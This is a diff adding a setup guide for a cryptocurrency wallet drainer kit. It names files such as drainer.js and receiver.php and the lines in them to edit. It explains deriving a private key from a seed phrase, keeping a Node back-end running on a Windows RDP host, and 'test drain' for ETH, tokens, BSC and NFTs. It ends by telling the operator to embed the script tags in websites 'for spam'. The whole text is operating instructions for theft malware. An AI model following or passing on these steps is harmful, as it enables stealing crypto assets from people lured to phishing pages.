@@ -1,0 +1,29 @@
+/seed (this folder needed to generate private key)
+This is to find out your private key to the wallet open convert.js.
+on the first line you insert a SEED phrase (which is a set of 12 or 24 words).
+save Then you run through start.bat, there will be a private key that starts with 0x,
+it looks the same as the wallet address, but a little longer, it's better to create a new empty wallet rather than using a personal one.
+
+Drainer/assets/js/drainer.js 
+edit line 2.
+
+Drainer/receiver.php
+edit line 3.
+edit line 4.
+
+/token/drainer.js 
+edit line 9.
+edit line 10.
+edit line 12.
+
+install nodejs (latest)
+run npm install in /token/ folder
+run node drainer.js in /token/ folder
+
+console should output "Drainer by XM8WyK" if all steps followed correctly. all is working.
+This is your back-end it has to be running all the time for drainer to work, host it on windows RDP, etc.
+
+Open index.html in Drainer folder.
+Test drain for ETH/Tokens/BSC/NFT.
+
+Now up to you to add code to websites/projects for spam, just copy <script> includes from example index.html file an upload all of Drainer folder to webhost.
